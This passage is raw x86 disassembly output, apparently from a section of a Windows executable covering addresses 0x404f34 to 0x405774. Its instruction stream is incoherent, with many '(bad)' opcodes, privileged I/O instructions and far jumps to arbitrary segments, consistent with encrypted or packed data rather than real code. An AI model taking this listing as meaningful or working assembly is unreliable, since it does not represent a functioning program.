  404f34:	ror    BYTE PTR [edx+0x5e924893],1
  404f3a:	lods   eax,DWORD PTR es:[esi]
  404f3c:	dec    esi
  404f3d:	push   ecx
  404f3e:	xchg   esp,eax
  404f3f:	les    esp,FWORD PTR [eax]
  404f41:	repnz push ss
  404f43:	add    DWORD PTR [eax-0x78],0xa447018b
  404f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f4b:	or     eax,0x57a9f429
  404f50:	ja     0x404f9a
  404f52:	adc    eax,0xf92fa4ac
  404f57:	iret   
  404f58:	inc    edi
  404f59:	cli    
  404f5a:	outs   dx,DWORD PTR ds:[esi]
  404f5b:	adc    eax,0x48a4fe62
  404f60:	and    eax,0x287561fc
  404f65:	lods   al,BYTE PTR ds:[esi]
  404f66:	sbb    ebp,DWORD PTR [eax-0x7a]
  404f69:	or     edx,DWORD PTR ds:0xfc4f07a0
  404f6f:	clc    
  404f70:	or     BYTE PTR [esi+0x203dddca],bl
  404f76:	jmp    0xf282:0x38237ae5
  404f7d:	jmp    0xc14b:0x9cc52b3f
  404f84:	iret   
  404f85:	ins    DWORD PTR es:[edi],dx
  404f86:	mov    ebp,0xe9a50458
  404f8b:	loopne 0x404f92
  404f8d:	push   cs
  404f8e:	add    DWORD PTR [ebx+edx*4],edx
  404f91:	jno    0x404fbf
  404f93:	mov    al,ds:0x4a68a006
  404f98:	mov    dl,0xf7
  404f9a:	call   0xcf45:0x96ce664f
  404fa1:	xor    DWORD PTR [eax-0x36],eax
  404fa4:	mov    ebx,0x49ed40a6
  404fa9:	outs   dx,BYTE PTR ds:[esi]
  404faa:	mov    edx,0xb60dcc56
  404faf:	or     eax,0xf74e7b1d
  404fb4:	jb     0x404fdd
  404fb6:	or     edx,eax
  404fb8:	sbb    esp,0xffe3923e
  404fbe:	inc    ecx
  404fbf:	ret    
  404fc0:	jbe    0x405008
  404fc2:	aam    0x3c
  404fc4:	adc    ah,BYTE PTR ds:0x7c4c321e
  404fca:	sbb    dl,BYTE PTR [eax-0xc]
  404fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fce:	cwde   
  404fcf:	loop   0x404fc5
  404fd1:	mov    ebp,DWORD PTR [esi+edi*2-0x56]
  404fd5:	popf   
  404fd6:	imul   edx,DWORD PTR [eax],0x6dae679
  404fdc:	dec    edx
  404fdd:	aam    0x5e
  404fdf:	icebp  
  404fe0:	(bad)  
  404fe1:	aad    0x19
  404fe3:	push   0xd84e0821
  404fe8:	ret    
  404fe9:	mov    ebp,0x7de204f6
  404fee:	or     ah,BYTE PTR [ecx-0x40]
  404ff1:	mov    ebp,0xb76ade44
  404ff6:	sbb    ah,bl
  404ff8:	cdq    
  404ff9:	cmp    ecx,DWORD PTR cs:[esi]
  404ffc:	adc    cl,BYTE PTR [edx-0x26]
  404fff:	xchg   edi,eax
  405000:	fiadd  DWORD PTR [ecx+ebx*2+0x75]
  405004:	test   eax,0xc3e0391d
  405009:	cmp    DWORD PTR [esi+ebx*4-0x41a60319],esi
  405010:	sbb    edx,DWORD PTR [eax+ebp*4]
  405013:	xor    DWORD PTR [edx+ebx*1],esi
  405016:	xor    BYTE PTR [ebp+0x33],0x24
  40501a:	pop    es
  40501b:	ret    0x6bfe
  40501e:	inc    edx
  40501f:	push   ss
  405020:	clc    
  405021:	js     0x405054
  405023:	mov    eax,0x6c0480b4
  405028:	ja     0x40500e
  40502a:	data16 mov ds:0x2ca47e3c,al
  405030:	test   eax,0x959b1175
  405035:	outs   dx,DWORD PTR ds:[esi]
  405036:	pusha  
  405037:	xor    al,0x32
  405039:	test   BYTE PTR [ebx+eax*8-0x51c21201],0x4e
  405041:	bsr    edi,DWORD PTR [ecx-0x31b50c09]
  405048:	ficom  WORD PTR [ebx]
  40504a:	popa   
  40504b:	out    0x57,al
  40504d:	inc    edx
  40504e:	test   ch,0x8
  405051:	loop   0x40509e
  405053:	jge    0x405025
  405055:	pop    ss
  405056:	push   0x5c
  405058:	mov    bl,0x8e
  40505a:	mov    cl,0x8b
  40505c:	fidiv  WORD PTR [esi]
  40505e:	add    eax,0x8f767186
  405063:	loop   0x405033
  405065:	imul   esi,ebp,0xffffff99
  405068:	xchg   edx,eax
  405069:	fwait
  40506a:	jo     0x405056
  40506c:	scas   eax,DWORD PTR es:[edi]
  40506d:	jecxz  0x405090
  40506f:	ficom  DWORD PTR [ecx+0x4bead219]
  405075:	sbb    al,0x3
  405077:	jp     0x405094
  405079:	jg     0x4050d4
  40507b:	sub    ch,al
  40507d:	shl    BYTE PTR [esp+esi*4+0x33],cl
  405081:	sti    
  405082:	mov    ecx,0x4a7ebe0d
  405087:	jmp    0xdce0c6f9
  40508c:	jecxz  0x4050fd
  40508e:	push   edx
  40508f:	mov    ah,0x33
  405091:	add    al,0xad
  405093:	pop    eax
  405094:	or     BYTE PTR [ebx+0x728d8e1],dh
  40509a:	ss mov bh,0xa5
  40509d:	mov    edi,0xfd423e43
  4050a2:	cs push es
  4050a4:	adc    eax,0x9918c466
  4050a9:	ret    
  4050aa:	leave  
  4050ab:	div    DWORD PTR [eax+0x52]
  4050ae:	pop    eax
  4050af:	pop    ax
  4050b1:	(bad)  
  4050b2:	iret   
  4050b3:	les    edx,FWORD PTR [esi-0x6c]
  4050b6:	ret    
  4050b7:	and    eax,0x76084a57
  4050bc:	jmp    0x6489:0xd018d739
  4050c3:	mov    edi,0xa5e729ad
  4050c8:	and    BYTE PTR [edi-0xf481cf6],bl
  4050ce:	add    DWORD PTR [edi],edi
  4050d0:	je     0x4050c6
  4050d2:	sub    eax,0x52140d6f
  4050d7:	mov    esp,0xcd493e01
  4050dc:	imul   edi,DWORD PTR [eax-0x6a85b51d],0x70
  4050e3:	cmp    al,0x55
  4050e5:	and    al,0x28
  4050e7:	xor    BYTE PTR [edx+0x4a8dc773],bl
  4050ed:	into   
  4050ee:	gs adc esp,esp
  4050f1:	cli    
  4050f2:	rol    DWORD PTR [ebx-0x32319fdd],0x4b
  4050f9:	mov    ds:0xa0f4accd,eax
  4050fe:	daa    
  4050ff:	js     0x40516d
  405101:	sub    ebp,edi
  405103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405104:	push   edx
  405105:	mov    eax,0x43f6cc73
  40510a:	inc    ebp
  40510b:	enter  0xae2,0xc5
  40510f:	fwait
  405110:	ss cdq 
  405112:	adc    DWORD PTR [esi+ecx*8+0x69],0x66
  405117:	mov    ebx,ds
  405119:	in     eax,dx
  40511a:	and    BYTE PTR [esi+0x77ba5a58],0x87
  405121:	out    dx,al
  405122:	mov    al,0xeb
  405124:	xlat   BYTE PTR ds:[ebx]
  405125:	xor    esp,esi
  405127:	icebp  
  405128:	inc    edx
  405129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40512a:	sub    al,0xcd
  40512c:	jns    0x405151
  40512e:	cld    
  40512f:	fs jp  0x405159
  405132:	mov    ebx,0x924d747
  405137:	pop    ecx
  405138:	cmp    ah,al
  40513a:	inc    ebp
  40513b:	jl     0x405152
  40513d:	les    edx,FWORD PTR [ecx]
  40513f:	lock push eax
  405141:	cmp    cl,ch
  405143:	adc    al,0x86
  405145:	pop    ds
  405146:	jle    0x405146
  405148:	cmp    DWORD PTR [esi+ecx*8+0x14],esi
  40514c:	sub    cl,BYTE PTR [ebp+0x30]
  40514f:	mov    ds:0x221671b2,eax
  405154:	fnstsw WORD PTR [esi+edx*8]
  405157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405158:	mov    al,0x28
  40515a:	push   esp
  40515b:	mov    edi,DWORD PTR [esi-0x7351288e]
  405161:	bound  esi,QWORD PTR ds:0x3fad1b9e
  405167:	pop    edi
  405168:	mov    edx,DWORD PTR [edx-0x21]
  40516b:	in     al,0xb5
  40516d:	adc    dh,BYTE PTR [ecx-0x596d20b3]
  405173:	mov    ecx,0x30db5b3b
  405178:	or     BYTE PTR [ecx],cl
  40517a:	xor    ch,BYTE PTR [esi]
  40517c:	push   ds
  40517d:	out    0x7b,al
  40517f:	fucomi st,st(4)
  405181:	sub    eax,0x5110e4a0
  405186:	pop    edx
  405187:	call   0xd391deae
  40518c:	shr    DWORD PTR [edi-0x2e],1
  40518f:	jb     0x405159
  405191:	dec    edx
  405192:	xchg   ebx,eax
  405193:	cli    
  405194:	dec    ebx
  405195:	icebp  
  405196:	xchg   ecx,eax
  405197:	dec    esp
  405198:	out    dx,eax
  405199:	test   al,0x6d
  40519b:	fisub  WORD PTR [ecx-0x2813404c]
  4051a1:	add    al,0xf3
  4051a3:	xchg   DWORD PTR [ebx],esi
  4051a5:	ja     0x40515b
  4051a7:	sub    DWORD PTR [esi],edi
  4051a9:	fxch   st(1)
  4051ab:	jo     0x405136
  4051ad:	adc    DWORD PTR ds:0xa76b0b7,edx
  4051b3:	gs mov dh,0x48
  4051b6:	icebp  
  4051b7:	push   cs
  4051b8:	dec    eax
  4051b9:	xchg   BYTE PTR [ebp-0x7e],ch
  4051bc:	das    
  4051bd:	jl     0x4051c1
  4051bf:	loop   0x4051be
  4051c1:	sti    
  4051c2:	icebp  
  4051c3:	and    ch,BYTE PTR [ebx+0x73]
  4051c6:	and    al,0x9c
  4051c8:	adc    edi,edi
  4051ca:	outs   dx,DWORD PTR ds:[esi]
  4051cb:	imul   edx,DWORD PTR [ecx],0xff667cdf
  4051d1:	push   ss
  4051d2:	inc    ecx
  4051d3:	jl     0x40521e
  4051d5:	out    dx,eax
  4051d6:	call   FWORD PTR [edi+0x34]
  4051d9:	push   ebp
  4051da:	or     al,0x10
  4051dc:	int    0x43
  4051de:	nop
  4051df:	mov    al,ds:0xf247cee3
  4051e4:	test   BYTE PTR [edi+0x1b],dh
  4051e7:	pop    eax
  4051e8:	ja     0x4051c8
  4051ea:	sub    ebp,DWORD PTR gs:[ecx+0x7e3995fd]
  4051f1:	cmp    edi,ecx
  4051f3:	add    al,0x3d
  4051f5:	mov    ebx,0x975a98aa
  4051fa:	push   0xffffff85
  4051fc:	fucomp st(5)
  4051fe:	xchg   esi,eax
  4051ff:	dec    esi
  405200:	aas    
  405201:	fwait
  405202:	(bad)  
  405204:	inc    esp
  405205:	popa   
  405206:	jg     0x405257
  405208:	mul    DWORD PTR [edx+0x35299523]
  40520e:	fsubr  QWORD PTR [ebx+0x50]
  405211:	jne    0x4051dc
  405213:	sub    edi,ebx
  405215:	out    dx,al
  405216:	out    0xb4,al
  405218:	sub    bh,BYTE PTR [eax-0x1c56151]
  40521e:	test   al,0xe1
  405220:	adc    bh,BYTE PTR [edx+0x34af851e]
  405226:	push   ecx
  405227:	push   0x9cb285cf
  40522c:	shl    BYTE PTR ss:[edi+0x76d6a14e],0x1c
  405234:	adc    al,0x7c
  405236:	ja     0x405207
  405238:	sti    
  405239:	xchg   edx,eax
  40523a:	xchg   BYTE PTR [esi-0x2918c032],cl
  405240:	mov    dh,0x88
  405242:	xchg   esp,eax
  405243:	fisub  DWORD PTR ds:0xfeccb889
  405249:	neg    BYTE PTR [ebx-0x3]
  40524c:	or     esi,DWORD PTR [ebx+0x4e]
  40524f:	jno    0x405274
  405251:	dec    ecx
  405252:	arpl   WORD PTR [edi-0x1d],bp
  405255:	shl    DWORD PTR [ebx+ebp*4+0x5f],1
  405259:	outs   dx,DWORD PTR ds:[esi]
  40525b:	adc    dh,BYTE PTR [ebx]
  40525d:	fs aam 0x86
  405260:	xchg   ecx,eax
  405261:	pop    eax
  405262:	jg     0x405291
  405264:	repnz push ecx
  405266:	and    esp,DWORD PTR [eax+0x3ed88f1e]
  40526c:	hlt    
  40526d:	cmp    dx,dx
  405270:	jge    0x4052b1
  405272:	jo     0x4052b7
  405274:	out    0x48,eax
  405276:	aas    
  405277:	cli    
  405278:	mov    eax,ds:0x86cdc13d
  40527d:	mov    ch,BYTE PTR [esi]
  40527f:	push   ds
  405280:	mov    ebp,0x70ef620a
  405285:	sahf   
  405286:	(bad)  
  405287:	cwde   
  405288:	xchg   ebp,eax
  405289:	add    BYTE PTR [ebp+ecx*4-0x5739423d],dh
  405290:	loopne 0x4052be
  405292:	scas   eax,DWORD PTR es:[edi]
  405293:	pop    ds
  405294:	(bad)  
  405296:	mov    gs,WORD PTR [esi+eax*1-0x530225d9]
  40529d:	in     al,0xd6
  40529f:	add    BYTE PTR [edx-0x54],bl
  4052a2:	mov    eax,ds:0x3053c057
  4052a7:	js     0x4052ac
  4052a9:	ins    BYTE PTR es:[edi],dx
  4052aa:	ret    
  4052ab:	dec    ebx
  4052ac:	dec    ecx
  4052ad:	xor    DWORD PTR [ebp-0x100eead],esi
  4052b3:	rcl    DWORD PTR [ecx+0x36],0xd
  4052b7:	(bad)  
  4052b8:	jl     0x405283
  4052ba:	add    DWORD PTR [ecx],edi
  4052bc:	pop    esp
  4052bd:	adc    BYTE PTR [ebp+0x60],al
  4052c0:	and    BYTE PTR ds:0x29cce762,bh
  4052c6:	arpl   bp,bx
  4052c8:	push   0xba34b187
  4052cd:	(bad)  
  4052ce:	rcr    DWORD PTR [ebp-0x7dacee17],cl
  4052d4:	sbb    ch,BYTE PTR [ebp+0x55e7de3a]
  4052da:	mov    ds:0x5ac9f1d0,al
  4052df:	and    bl,BYTE PTR [ecx+0x78]
  4052e2:	xor    DWORD PTR [ecx+ecx*8+0x56d62180],ecx
  4052e9:	stos   BYTE PTR es:[edi],al
  4052ea:	cmp    al,0x6b
  4052ec:	scas   al,BYTE PTR es:[edi]
  4052ed:	sbb    ebp,esp
  4052ef:	(bad)  
  4052f0:	jmp    FWORD PTR ds:0xa6136bc9
  4052f6:	in     eax,0x69
  4052f8:	xor    ebp,DWORD PTR [ebx-0x64]
  4052fb:	add    BYTE PTR [edi+0x406caf07],0xc7
  405302:	in     al,0x6c
  405304:	adc    eax,0x3314d20b
  405309:	mov    esi,DWORD PTR [ebx-0x42]
  40530c:	(bad)  [ecx+0x6e32b24a]
  405312:	add    eax,DWORD PTR [esi]
  405314:	add    cl,BYTE PTR [eax+0x53]
  405317:	mov    ah,0xb1
  405319:	dec    edx
  40531a:	(bad)  
  40531b:	xchg   ebp,eax
  40531c:	mov    ecx,0x95ade87b
  405321:	cli    
  405322:	imul   esp,ebp,0xffffffe1
  405325:	jae    0x4052a7
  405327:	mov    bh,0xf1
  405329:	hlt    
  40532a:	lds    esp,FWORD PTR [esi-0xa]
  40532d:	repnz sbb BYTE PTR [ecx-0x36],al
  405331:	or     bh,BYTE PTR [ecx+0x31dbed7e]
  405337:	add    ebx,DWORD PTR [edx+ebx*4-0x68]
  40533b:	mov    eax,ds:0x948f0427
  405340:	inc    edi
  405341:	ret    
  405342:	dec    ebx
  405343:	xchg   BYTE PTR [edi+0x67],al
  405346:	push   edx
  405347:	sbb    al,0xc1
  405349:	shr    DWORD PTR [esi+edx*1+0x4e],0x4a
  40534e:	and    eax,0x68185014
  405353:	imul   ecx,DWORD PTR [edi+0x7cd72e5f],0xd80aeef4
  40535d:	out    dx,eax
  40535e:	retf   0x7786
  405361:	call   0xabe3a5bf
  405366:	mov    BYTE PTR [edi-0x6fa7d232],ah
  40536c:	sti    
  40536d:	fcomp  DWORD PTR [eax-0x5af64b01]
  405373:	add    DWORD PTR [edx+0x65195893],edx
  405379:	addr16 jg 0x40537b
  40537c:	je     0x4053cc
  40537e:	pushf  
  40537f:	cmp    al,0x8d
  405381:	mov    esi,ebx
  405383:	xchg   ebx,eax
  405384:	sub    DWORD PTR fs:[edx],edx
  405387:	push   es
  405388:	pop    eax
  405389:	aaa    
  40538a:	out    dx,al
  40538b:	adc    bl,ch
  40538d:	xor    ch,bh
  40538f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405390:	fdiv   st,st(1)
  405392:	jmp    0xbcad:0xbfd8d7f3
  405399:	push   eax
  40539a:	call   0x8ae7:0x4bef2fdb
  4053a1:	and    eax,0xd2a2291c
  4053a6:	jle    0x4053d6
  4053a8:	add    al,0xc1
  4053aa:	push   ebp
  4053ab:	scas   al,BYTE PTR es:[edi]
  4053ac:	add    eax,0x9eeadb4
  4053b1:	and    al,BYTE PTR [ecx-0x16]
  4053b4:	or     al,0xc9
  4053b6:	addr16 pop edi
  4053b8:	lds    esi,FWORD PTR [ebp+ebx*4+0x32]
  4053bc:	arpl   sp,di
  4053be:	imul   BYTE PTR fs:[edi-0x26c708b1]
  4053c5:	xchg   DWORD PTR [esi+0x37f2d254],ebp
  4053cb:	add    dl,cl
  4053cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053ce:	inc    edi
  4053cf:	xchg   DWORD PTR [esi+0x28b071f3],esp
  4053d5:	js     0x4053d2
  4053d7:	aas    
  4053d8:	jnp    0x405441
  4053da:	stos   BYTE PTR es:[edi],al
  4053db:	jbe    0x405387
  4053dd:	add    al,0xa
  4053df:	pop    esp
  4053e0:	push   0x38d00cdf
  4053e5:	adc    eax,0x9af988e6
  4053ea:	xchg   esp,eax
  4053eb:	adc    edx,0x7e91e0f8
  4053f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053f2:	sub    al,0x6a
  4053f4:	aam    0x98
  4053f6:	jge    0x405414
  4053f8:	mov    ecx,0xee85bef
  4053fd:	inc    ax
  4053ff:	in     al,0xaf
  405401:	mov    ah,0x39
  405403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405404:	xor    esi,DWORD PTR [esi+0x7a]
  405407:	mov    BYTE PTR [edi],ah
  405409:	es adc dh,BYTE PTR ss:[ebx+0x6]
  40540e:	mov    cl,0xd6
  405410:	dec    esi
  405411:	popf   
  405412:	pop    edi
  405413:	(bad)
  405417:	xchg   ebx,eax
  405418:	cmp    ebx,DWORD PTR [ebx-0x66a4948c]
  40541e:	inc    esp
  40541f:	dec    edx
  405420:	dec    esp
  405421:	outs   dx,DWORD PTR ds:[esi]
  405422:	push   cs
  405423:	xor    eax,ebp
  405425:	or     al,0xcc
  405427:	hlt    
  405428:	ret    0xe603
  40542b:	add    ah,BYTE PTR [edx+0x578a298c]
  405431:	sub    al,bl
  405433:	repz sar ebx,cl
  405436:	call   0x533c526b
  40543b:	pop    ebp
  40543c:	push   ebx
  40543d:	pop    esi
  40543e:	mov    edi,0xc56ea677
  405443:	imul   esp,DWORD PTR ds:0x425671ca,0xffffffa2
  40544a:	xor    BYTE PTR [ebx-0x567f99b3],0x12
  405451:	loope  0x405402
  405453:	mov    edi,0xe513a112
  405458:	and    eax,0xa4a24220
  40545d:	sbb    eax,0x661dc411
  405462:	cwde   
  405463:	outs   dx,BYTE PTR ds:[esi]
  405464:	mov    ah,BYTE PTR [esi]
  405466:	fcomp  QWORD PTR [ebx-0x5003e596]
  40546c:	push   0x6d081faf
  405471:	sti    
  405472:	pop    ecx
  405473:	xchg   ebp,eax
  405474:	dec    eax
  405475:	pop    edi
  405476:	mov    ebp,0x11c24be3
  40547b:	sahf   
  40547c:	mov    ds:0x2da6d356,eax
  405481:	fisubr DWORD PTR [esi+0x2b171bed]
  405487:	mov    esp,ecx
  405489:	sub    BYTE PTR [edx+0x1ca7ec60],dl
  40548f:	xchg   esp,eax
  405490:	adc    dl,ah
  405492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405493:	adc    eax,0xd6ad21a0
  405498:	add    DWORD PTR [esi+0x730a7928],0xa1d731cc
  4054a2:	les    ebp,FWORD PTR [edi+0x2e]
  4054a5:	retf   
  4054a6:	or     dh,BYTE PTR [ecx+0x25]
  4054a9:	(bad)  
  4054aa:	mov    ecx,0x5330dd27
  4054af:	push   es
  4054b0:	out    0x62,al
  4054b2:	nop
  4054b3:	iret   
  4054b4:	fs in  eax,0x59
  4054b7:	aad    0xd0
  4054b9:	xor    al,0x13
  4054bb:	lds    eax,FWORD PTR [esi-0x2831c19d]
  4054c1:	ror    esi,0xc6
  4054c4:	xor    BYTE PTR [ecx],cl
  4054c6:	lods   eax,DWORD PTR ds:[esi]
  4054c7:	aad    0xe
  4054c9:	xor    cl,dl
  4054cb:	jge    0x4054ab
  4054cd:	inc    edx
  4054ce:	mov    ds:0x2e807792,eax
  4054d3:	test   eax,0x960700e3
  4054d8:	xor    al,0xad
  4054da:	dec    edx
  4054db:	lea    ebx,ds:0x90e52758
  4054e1:	(bad)  
  4054e2:	cld    
  4054e3:	lods   al,BYTE PTR ds:[esi]
  4054e4:	iret   
  4054e5:	xchg   edi,eax
  4054e6:	sahf   
  4054e7:	out    dx,eax
  4054e8:	or     BYTE PTR [edx],0x49
  4054eb:	stc    
  4054ec:	jg     0x405509
  4054ee:	mov    ds:0x3d8002f9,eax
  4054f3:	enterw 0xe2c7,0xe4
  4054f8:	aad    0xbd
  4054fa:	aad    0x47
  4054fc:	or     BYTE PTR [eax-0x3c],0xcb
  405500:	and    al,0xa5
  405502:	rcl    BYTE PTR [edx],0x7b
  405505:	lea    eax,[edx+0x42]
  405508:	jbe    0x405493
  40550a:	xlat   BYTE PTR ds:[ebx]
  40550b:	je     0x4054a1
  40550d:	ror    bl,cl
  40550f:	mov    edi,0xc90f7047
  405514:	inc    ebp
  405515:	or     ecx,DWORD PTR [edx]
  405517:	dec    ebp
  405518:	inc    ebp
  405519:	push   0xffffffcd
  40551b:	jmp    0xfb786208
  405520:	mov    bl,ah
  405522:	inc    ecx
  405523:	mov    BYTE PTR [edi+0x760684fc],dh
  405529:	test   DWORD PTR [eax-0x45ec73b7],eax
  40552f:	jbe    0x405596
  405531:	xor    BYTE PTR [edx+0x42],bl
  405534:	mov    DWORD PTR [ecx-0x66b3759c],ebp
  40553a:	pop    esi
  40553b:	push   eax
  40553c:	test   BYTE PTR [edi+0xbf76f59],bl
  405542:	xchg   edi,eax
  405543:	repnz add DWORD PTR [edx+0x2a4ab009],edi
  40554a:	clc    
  40554b:	test   ch,bh
  40554d:	mov    ch,0xb
  40554f:	ffreep st(6)
  405551:	(bad)
  405554:	pop    eax
  405555:	out    0xd4,eax
  405557:	fucomi st,st(0)
  405559:	dec    edi
  40555a:	and    DWORD PTR [esi-0x3ed1a3b7],esi
  405560:	inc    edi
  405561:	sub    eax,esp
  405563:	cld    
  405564:	dec    edx
  405565:	push   0x4907fd2b
  40556a:	btr    DWORD PTR [esi-0x5b],esi
  40556e:	das    
  40556f:	sbb    dl,BYTE PTR [ebp-0x9bed5bb]
  405575:	call   FWORD PTR [ebx]
  405577:	lds    edx,FWORD PTR [edi-0x25]
  40557a:	adc    al,0x89
  40557c:	ins    DWORD PTR es:[edi],dx
  40557d:	sub    eax,0x5e1efc01
  405582:	aam    0x7
  405584:	test   ah,ah
  405586:	jbe    0x4055d8
  405588:	in     eax,dx
  405589:	loope  0x405581
  40558b:	inc    ecx
  40558c:	cmp    ebx,ebp
  40558e:	fild   QWORD PTR [esi]
  405591:	loopne 0x405567
  405593:	add    esi,DWORD PTR [edx-0x62]
  405596:	aam    0xd5
  405598:	jecxz  0x40560a
  40559a:	xor    eax,0xdfaa228f
  40559f:	xchg   edx,eax
  4055a0:	xor    DWORD PTR [edi],0xfa3ecb72
  4055a6:	cmp    al,0xf
  4055a8:	pop    eax
  4055a9:	add    eax,0x9c7ec4b9
  4055ae:	jg     0x4055e9
  4055b0:	ficom  DWORD PTR [ebx]
  4055b2:	xor    BYTE PTR [edi],dh
  4055b4:	test   bh,dl
  4055b6:	sbb    eax,0x93672140
  4055bb:	addr16 fnstsw ax
  4055be:	inc    edi
  4055bf:	shl    BYTE PTR [eax-0x2a],1
  4055c2:	ret    
  4055c3:	cmp    ax,0x4706
  4055c7:	lea    esp,[edx+0xc]
  4055ca:	xor    edx,DWORD PTR [esi]
  4055cc:	mov    eax,0xd45d9f31
  4055d1:	pop    eax
  4055d2:	and    BYTE PTR [ebx+0x4e8d7e5f],0x3
  4055d9:	or     edi,esp
  4055db:	or     eax,esp
  4055dd:	adc    ch,al
  4055df:	inc    ecx
  4055e0:	std    
  4055e1:	leave  
  4055e2:	je     0x40565f
  4055e4:	or     BYTE PTR [ebp-0xb25cfde],cl
  4055ea:	add    al,0xc1
  4055ec:	lds    edi,FWORD PTR [edx-0x49]
  4055ef:	mov    edx,0xd40f1b65
  4055f4:	jno    0x4055aa
  4055f6:	mov    dl,0x74
  4055f8:	nop
  4055f9:	push   0x17
  4055fb:	shl    DWORD PTR [eax-0x24736c22],cl
  405601:	push   ds
  405602:	das    
  405603:	push   ss
  405604:	add    ebp,DWORD PTR [eax-0x25]
  405607:	mov    bh,0xc6
  405609:	jl     0x405652
  40560b:	mov    edx,0x128a19b0
  405610:	(bad)  
  405612:	add    DWORD PTR [esi+0x490a2f4c],edx
  405618:	idiv   ebp
  40561a:	mov    edi,esi
  40561c:	mov    WORD PTR [edx-0x44ef0d46],ss
  405622:	or     esi,DWORD PTR [esp+eiz*4]
  405625:	rcr    BYTE PTR ss:[edi+edx*8],0x35
  40562a:	xor    eax,0x1bfc6802
  40562f:	sbb    BYTE PTR [ecx+ebx*2],ch
  405632:	inc    esi
  405633:	mov    ebp,0xc019ef98
  405638:	rol    DWORD PTR [esi],0x15
  40563b:	out    0xb7,al
  40563d:	pop    ecx
  40563e:	pop    eax
  40563f:	or     DWORD PTR [ebp-0x5d8682ed],ebx
  405645:	into   
  405646:	(bad)
  40564a:	mov    al,0xe1
  40564c:	push   ds
  40564d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564f:	gs ret 
  405651:	sar    ch,0xc9
  405654:	sahf   
  405655:	mov    ds:0xfdc79357,eax
  40565a:	hlt    
  40565b:	inc    DWORD PTR [ebp+0x31]
  40565e:	mov    bh,0xde
  405660:	out    dx,eax
  405661:	lock imul edx,DWORD PTR [esi],0x9
  405665:	mov    cl,0xdc
  405667:	or     eax,0xab405257
  40566c:	pop    ds
  40566d:	pushf  
  40566e:	xchg   ebx,eax
  40566f:	pushf  
  405670:	ins    BYTE PTR es:[edi],dx
  405671:	ret    
  405672:	mov    ecx,0x592875ee
  405677:	fdivr  DWORD PTR [ebx]
  405679:	ficom  DWORD PTR [ecx-0x1414d995]
  40567f:	adc    al,0xd4
  405681:	scas   al,BYTE PTR es:[edi]
  405682:	test   BYTE PTR [edi+0x3b],bh
  405685:	test   al,cl
  405687:	in     al,0x86
  405689:	xchg   esp,eax
  40568a:	xchg   edi,eax
  40568b:	popa   
  40568c:	rol    DWORD PTR [edx+0xf4f456c],cl
  405692:	mov    ecx,0x4d0038d7
  405697:	stos   DWORD PTR es:[edi],eax
  405698:	pop    ebx
  405699:	cmc    
  40569a:	cld    
  40569b:	push   esp
  40569c:	mov    bh,0x51
  40569e:	(bad)  
  40569f:	lahf   
  4056a0:	cmp    ebx,eax
  4056a2:	out    0x94,eax
  4056a4:	nop
  4056a5:	enter  0x3cbb,0xe8
  4056a9:	ror    DWORD PTR ds:0xfd029b16,cl
  4056af:	rcl    BYTE PTR [esi+0x21],cl
  4056b2:	js     0x40563d
  4056b4:	cdq    
  4056b5:	and    DWORD PTR [eax+0x1b],0xffffffcd
  4056b9:	pop    es
  4056ba:	(bad)  
  4056bb:	stc    
  4056bc:	mov    esi,0x3c9724cf
  4056c1:	sbb    al,0xc7
  4056c3:	test   BYTE PTR [eax+eax*1-0xec6c727],0x6c
  4056cb:	add    ah,BYTE PTR [ebx-0x3]
  4056ce:	(bad)  
  4056cf:	push   edi
  4056d0:	sub    DWORD PTR [esi+0x20],esp
  4056d3:	cli    
  4056d4:	rcr    DWORD PTR [ecx],0x2a
  4056d7:	jb     0x405679
  4056d9:	xchg   DWORD PTR [esi+0x3e],ebx
  4056dc:	repz inc edx
  4056de:	(bad)  [edx-0x4958d7fc]
  4056e4:	imul   eax,edx,0xffffffcc
  4056e7:	push   0x78
  4056e9:	es xchg edi,eax
  4056eb:	fstp   DWORD PTR [ebx]
  4056ed:	repz xlat BYTE PTR ds:[ebx]
  4056ef:	dec    edx
  4056f0:	call   0x342e3b48
  4056f5:	push   edx
  4056f6:	bound  ebp,QWORD PTR [esp+edx*1+0x2fa21452]
  4056fd:	mov    al,ds:0xeadbba6f
  405702:	ret    
  405703:	in     al,dx
  405704:	pop    esi
  405705:	xor    DWORD PTR ds:0x89f5f0b0,esp
  40570b:	pop    ebx
  40570c:	xor    esp,edi
  40570e:	je     0x40571e
  405710:	pushf  
  405711:	push   ds
  405712:	xchg   esi,eax
  405713:	sub    esp,DWORD PTR [esi-0x2]
  405716:	push   ebx
  405717:	xchg   DWORD PTR [edi+0x49824786],ecx
  40571d:	mul    DWORD PTR [ecx-0x7c]
  405720:	mov    dh,0xb4
  405722:	addr16 push ebx
  405724:	pop    esp
  405725:	int    0xe4
  405727:	jnp    0x40575b
  405729:	push   ecx
  40572a:	lods   al,BYTE PTR ds:[esi]
  40572b:	xor    eax,0xf4432049
  405730:	sbb    ebx,DWORD PTR [edi+0x4c]
  405733:	xor    DWORD PTR [edx],ecx
  405735:	outs   dx,BYTE PTR ds:[esi]
  405736:	push   ebx
  405737:	mov    dh,BYTE PTR [edx-0x4e1b4695]
  40573d:	xchg   esp,eax
  40573e:	and    eax,0x645f0373
  405743:	ror    ebp,1
  405745:	(bad)  
  405746:	jg     0x4057ba
  405748:	mov    dl,0x15
  40574a:	mov    ah,0xc0
  40574c:	lock nop
  40574e:	out    dx,al
  40574f:	mov    ebp,ecx
  405751:	pop    esi
  405752:	xlat   BYTE PTR ds:[ebx]
  405753:	mov    cl,0x3
  405755:	and    eax,0xa9ed56ef
  40575a:	or     eax,esp
  40575c:	xchg   ebp,eax
  40575d:	test   eax,0xff3161b8
  405762:	gs mov bl,0x7c
  405765:	sbb    eax,0x1548c5df
  40576a:	gs pop es
  40576c:	(bad)  
  40576d:	pop    ebx
  40576e:	or     ebx,DWORD PTR [edi+0x1dd342d2]
  405774:	es ss dec esp
